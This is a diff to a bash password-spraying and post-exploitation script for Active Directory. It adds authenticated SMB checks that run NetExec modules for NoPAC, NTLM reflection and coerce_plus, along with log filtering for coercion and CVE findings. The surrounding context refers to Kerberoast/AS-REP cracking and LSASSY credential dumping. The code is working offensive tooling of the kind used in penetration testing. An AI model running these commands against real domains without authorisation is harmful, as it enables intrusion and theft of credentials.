@@ -1585,7 +1585,7 @@ FINAL_CRACKED="$OUTDIR/final_cracked_asrep_kerberoast.txt"
 echo "" > "$FINAL_CRACKED"
 
 echo -e "${PURPLE}====================================================${NC}"
-echo -e "${GREEN}[+] SPRAY ENGINE v59 | DEBUG & EXPLICIT MODE${NC}"
+echo -e "${GREEN}[+] Spray Auth All Protocol${NC}"
 echo -e "${PURPLE}====================================================${NC}"
 
 # Validasi File
@@ -1664,6 +1664,13 @@ get_domain() {
 
     DOMAIN_CACHE[$ip]="$domain"
     echo "$domain"
+}
+
+# --- HELPER FUNCTION FOR NETEXEC CLEANING ---
+clean_nxc_file() {
+    local file="$1"
+    [[ ! -f "$file" ]] && return 0
+    LC_ALL=C perl -i -pe 's/\x00//g; s/\r//g' "$file"
 }
 
 # =========================
@@ -1939,6 +1946,57 @@ for ip in "${!PROTO_MAP[@]}"; do
                                 fi
 
                             done
+                            # -------------------------------------------------------
+                            # 2. AUTHENTICATED SMB VULNERABILITY CHECKS
+                            # -------------------------------------------------------
+                            echo -e "\n${YELLOW}[*] SMB Auth: Running post-exploit vulnerability checks...${NC}"
+
+                            # --- A. NoPAC (KB5008380 / SamAccountName Spoofing) ---
+                            NOPAC_CMD="nxc smb $ip -u '$user' -p '$pass' $DOMAIN_ARG -M nopac"
+                            echo -e "${MAGENTA}[CMD] $NOPAC_CMD${NC}"
+                            
+                            timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M nopac 2>&1 | tee .tmp_nopac | tee -a "$RAW_OUT"
+                            clean_nxc_file .tmp_nopac
+
+                            if grep -aqi "VULNERABLE" .tmp_nopac; then
+                                echo -e "${RED}[!!!] ALERT: $ip is VULNERABLE to NoPAC (CVE-2021-42278/CVE-2021-42287)!${NC}"
+                                echo "[!] NoPAC VULNERABLE on $ip (Auth User: $user)" >> "$RAW_OUT"
+                            else
+                                echo -e "${GREEN}[+] NoPAC check completed (Not vulnerable or patched).${NC}"
+                            fi
+
+
+                            # --- B. NTLM Reflection ---
+                            NTLM_REF_CMD="nxc smb $ip -u '$user' -p '$pass' $DOMAIN_ARG -M ntlm_reflection"
+                            echo -e "${MAGENTA}[CMD] $NTLM_REF_CMD${NC}"
+                            
+                            timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M ntlm_reflection 2>&1 | tee .tmp_ntlmref | tee -a "$RAW_OUT"
+                            clean_nxc_file .tmp_ntlmref
+
+                            if grep -aqi "vulnerable" .tmp_ntlmref; then
+                                echo -e "${RED}[!!!] ALERT: $ip is VULNERABLE to NTLM Reflection!${NC}"
+                                echo "[!] NTLM Reflection VULNERABLE on $ip (Auth User: $user)" >> "$RAW_OUT"
+                            else
+                                echo -e "${GREEN}[+] NTLM Reflection check completed.${NC}"
+                            fi
+
+
+                            # --- C. Coerce Plus (Authenticated Coercion Check) ---
+                            # Kita jalankan kembali dengan kredensial karena beberapa RPC interface hanya bisa di-trigger setelah auth
+                            COERCE_AUTH_CMD="nxc smb $ip -u '$user' -p '$pass' $DOMAIN_ARG -M coerce_plus"
+                            echo -e "${MAGENTA}[CMD] $COERCE_AUTH_CMD${NC}"
+                            
+                            timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M coerce_plus 2>&1 | tee .tmp_coerce_auth | tee -a "$RAW_OUT"
+                            clean_nxc_file .tmp_coerce_auth
+
+                            if grep -aqi "vulnerable" .tmp_coerce_auth || grep -aqi "success" .tmp_coerce_auth; then
+                                echo -e "${RED}[!!!] ALERT: Coercion (coerce_plus) vulnerability detected on $ip with authenticated user!${NC}"
+                            else
+                                echo -e "${GREEN}[+] Authenticated Coercion check completed.${NC}"
+                            fi
+
+                            # Bersihkan temporary files
+                            rm -f .tmp_nopac .tmp_ntlmref .tmp_coerce_auth
 
                             # -------------------------------------------------------
                             # 2. LSASSY (With Retry Logic - Only if Pwn3d!)
@@ -1995,8 +2053,8 @@ if [[ -f "$RAW_OUT" ]]; then
     sed -E 's/\x1B\[[0-9;]*[mGK]//g' "$RAW_OUT" > "$OUTDIR/temp_clean.log"
 
     # 2. Ambil baris penting & dedup tanpa ubah urutan
-    grep -aE "\[\*\]|\[\+\]|LSASSY" "$OUTDIR/temp_clean.log" | \
-        awk '!seen[$0]++' > "$FINAL_OUT"
+    grep -aEi "\[\*\]|\[\+\]|LSASSY|VULN|TGT with|TGT without|PetitPotam|DFSCoerce|ShadowCoerce|CVE" "$OUTDIR/temp_clean.log" | \
+    awk '!seen[$0]++' > "$FINAL_OUT"
 
     echo -e "\n${PURPLE}====================================================${NC}"
     echo -e "${GREEN}[+] PHASE 4: FINAL CHRONOLOGICAL SUMMARY${NC}"
